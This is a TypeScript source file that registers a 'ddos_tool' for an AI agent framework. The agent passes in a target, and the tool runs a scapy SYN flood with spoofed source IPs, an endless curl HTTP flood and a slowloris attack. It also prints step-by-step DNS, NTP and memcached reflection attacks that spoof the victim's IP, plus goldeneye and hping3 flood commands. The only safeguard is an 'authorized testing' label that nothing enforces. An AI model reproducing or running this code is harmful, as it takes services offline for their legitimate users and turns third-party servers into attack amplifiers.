export * as DdosTool from "./ddos-tool"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "ddos_tool"

export const Input = Schema.Struct({
  target: Schema.String.annotate({ description: "Target IP or hostname" }),
  port: Schema.Number.pipe(Schema.optional).annotate({ description: "Target port. Default: 80." }),
  action: Schema.String.annotate({
    description: "DoS action: 'syn_flood', 'http_flood', 'slowloris', 'dns_amp', 'ntp_amp', 'memcached_amp', 'app_layer', 'goldeneye'",
  }),
  duration: Schema.Number.pipe(Schema.optional).annotate({ description: "Attack duration in seconds. Default: 60." }),
  threads: Schema.Number.pipe(Schema.optional).annotate({ description: "Number of threads. Default: 10." }),
  amp_list: Schema.String.pipe(Schema.optional).annotate({ description: "Path to amplifier list (for amplification attacks). Default: use Shodan." }),
})

const Output = Schema.Struct({ output: Schema.String, exit: Schema.Number.pipe(Schema.optional) })

const layer = Layer.effectDiscard(Effect.gen(function* () {
  const tools = yield* Tools.Service
  const appProcess = yield* AppProcess.Service

  yield* tools.register({
    [name]: Tool.make({
      description: `DoS/DDoS testing tools for authorized stress testing. SYN flood, HTTP flood, Slowloris (slow HTTP header attack), DNS amplification, NTP amplification, Memcached amplification, application-layer DoS, and GoldenEye multi-vector attack. Each generates or executes the appropriate attack. For authorized load/stress testing only.`,
      input: Input, output: Output,
      toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
      execute: (input) => Effect.gen(function* () {
        const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
        const duration = input.duration ?? 60
        const port = input.port ?? 80
        const threads = input.threads ?? 10

        switch (input.action) {
          case "syn_flood": {
            // Use scapy for SYN flood
            const cmd = ChildProcess.make("python3", ["-c", `
from scapy.all import *
import random, sys, threading, time
target="${input.target}"; port=${port}; dur=${duration}
def syn():
    end=time.time()+dur
    while time.time()<end:
        src_port=random.randint(1024,65535)
        seq=random.randint(1000,9000)
        win=random.randint(1000,9000)
        pkt=IP(src=RandIP(),dst=target)/TCP(sport=src_port,dport=port,flags="S",seq=seq,window=win)
        send(pkt,verbose=0)
threads=[threading.Thread(target=syn) for _ in range(${threads})]
[t.start() for t in threads]; [t.join() for t in threads]
print("SYN flood complete: "+target+":"+str(port)+" for "+str(dur)+"s with "+str(${threads})+" threads")
`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(duration + 30) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 60), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "SYN flood requires scapy: pip install scapy" }
          }

          case "http_flood": {
            const cmd = ChildProcess.make("bash", ["-c", `for i in $(seq 1 ${threads}); do (while true; do curl -s -o /dev/null "http://${input.target}:${port}/" 2>/dev/null; done &) done; sleep ${duration}; kill $(jobs -p) 2>/dev/null; echo "HTTP flood complete"`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(duration + 15) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "HTTP flood failed." }
          }

          case "slowloris": {
            const pythonCode = `
import socket, time, random, threading
target="${input.target}"; port=${port}; dur=${duration}; sockets=[]
def create():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((target,port))
        s.send(f"GET /?{random.randint(0,1000)} HTTP/1.1\\r\\nHost: {target}\\r\\nUser-Agent: Mozilla/5.0\\r\\nContent-Length: 42\\r\\n".encode())
        return s
    except: return None
end=time.time()+dur
while time.time()<end:
    for _ in range(${threads}):
        s=create()
        if s: sockets.append(s)
    for s in sockets[:]:
        try: s.send(f"X-a: {random.randint(1,5000)}\\r\\n".encode())
        except: sockets.remove(s)
    time.sleep(2)
print(f"Slowloris complete: {target}:{port} for {dur}s")
`
            const cmd = ChildProcess.make("python3", ["-c", pythonCode], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(duration + 30) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 60), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "Slowloris failed." }
          }

          case "dns_amp":
          case "ntp_amp":
          case "memcached_amp": {
            const proto = input.action.replace("_amp", "")
            const ports: Record<string, number> = { dns: 53, ntp: 123, memcached: 11211 }
            const protoPort = ports[proto] ?? 53
            return {
              exit: 0,
              output: `${proto.toUpperCase()} Amplification Attack:

1. Find amplifiers (servers responding to ${proto} queries):
   Shodan: port:${protoPort} country:US
   Or: nmap -sU -p ${protoPort} --script=${proto === "dns" ? "dns-recursion" : proto === "ntp" ? "ntp-monlist" : "memcached-info"} SUBNET

2. Amplification factors:
   DNS: 50-100x
   NTP: 556x (via monlist)
   Memcached: 51,000x (!!)

3. Spoofed source = victim IP:
   python3 -c "
from scapy.all import *
victim='${input.target}'
# DNS amplification
pkt=IP(src=victim,dst='AMPLIFIER_IP')/UDP(sport=${protoPort},dport=${protoPort})/${proto === "dns" ? "DNS(id=1,qr=0,qd=DNSQR(qname='.'))" : proto === "ntp" ? "Raw(load='\\x17\\x00\\x03\\x2a' + '\\x00'*4)" : "Raw(load='\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n'"}
send(pkt)
"

4. Scapy for bulk spoofed amplification:
   for amp in amplifiers: send(IP(src=victim,dst=amp)/UDP(dport=${protoPort})/PAYLOAD)

[WARNING] Requires network that allows IP spoofing (most cloud/hosting providers block it).
Duration: ${duration}s, Target: ${input.target}`,
            }
          }

          case "app_layer":
          case "goldeneye": {
            return {
              exit: 0,
              output: `Application-Layer DoS (GoldenEye method):

python3 goldeneye.py http://${input.target}:${port}/ -w ${threads} -s 100 -m ${duration}

Or manual method:
1. Send many concurrent slow HTTP requests
2. Each keeps connection open with partial requests
3. Server runs out of connection slots
4. Legitimate users can't connect

curl-based slow read attack:
while true; do
  curl -s --limit-rate 1 -o /dev/null http://${input.target}:${port}/ &
done

Or use hping3 for TCP flood:
hping3 -S --flood -V -p ${port} ${input.target}`,
            }
          }

          default:
            return { output: `Unknown action: ${input.action}. Supported: syn_flood, http_flood, slowloris, dns_amp, ntp_amp, memcached_amp, app_layer, goldeneye` }
        }
      }).pipe(Effect.mapError(() => new ToolFailure({ message: "DoS tool failed" }))),
    }),
  }).pipe(Effect.orDie)
}))

export const node = makeLocationNode({ name: "tool/ddos-tool", layer, deps: [ToolRegistry.node, AppProcess.node] })
